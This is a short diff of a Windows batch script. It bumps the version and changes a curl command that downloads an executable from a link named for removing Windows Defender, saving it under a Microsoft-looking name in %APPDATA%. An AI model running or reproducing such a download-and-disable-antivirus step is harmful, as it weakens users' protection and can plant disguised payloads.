@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=28.2"
+set "BATCHVERSION=28.3"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 
@@ -1691,7 +1691,7 @@ echo.
 
  
 :: Download the file using curl
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%WINDEFREMOVERFILELINK%"
+curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%WINDEFREMOVERFILELINK%"
  
 timeout /t 2 /nobreak >nul
  
